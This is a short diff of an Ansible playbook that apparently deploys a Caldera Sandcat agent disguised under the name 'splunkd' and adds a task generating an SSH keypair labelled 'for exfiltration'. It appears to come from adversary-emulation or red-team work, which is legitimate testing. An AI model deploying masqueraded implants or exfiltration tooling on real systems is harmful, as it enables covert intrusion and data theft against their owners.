@@ -24,6 +24,12 @@
         msg: "Sandcat binary at /opt/splunkd is not executable"
       when: not sandcat_stat.stat.executable
 
+    - name: Generate SSH keypair for exfiltration
+      openssh_keypair:
+        path: "~/.ssh/id_ed25519"
+        type: ed25519
+        force: false
+
     - name: Kill any existing sandcat process
       shell: pkill -f '[s]plunkd' || true
       changed_when: false
